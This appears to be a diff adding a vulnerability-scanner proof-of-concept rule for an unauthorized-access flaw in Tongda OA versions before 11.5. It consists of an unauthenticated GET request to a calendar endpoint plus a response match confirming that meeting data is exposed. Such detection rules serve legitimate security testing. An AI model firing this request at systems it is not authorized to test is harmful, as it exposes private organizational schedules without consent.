@@ -1,0 +1,16 @@
+name: poc-yaml-tongda-meeting-unauthorized-access
+rules:
+  - method: GET
+    path: >-
+      /general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay
+    headers:
+      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
+      Accept-Encoding: 'deflate'
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes(string("creator"))) && response.body.bcontains(bytes(string("originalTitle")))
+detail:
+  author: 清风明月(www.secbook.info)
+  influence_version: ' < 通达OA 11.5'
+  links:
+    - https://mp.weixin.qq.com/s/3bI7v-hv4rMUnCIT0GLkJA
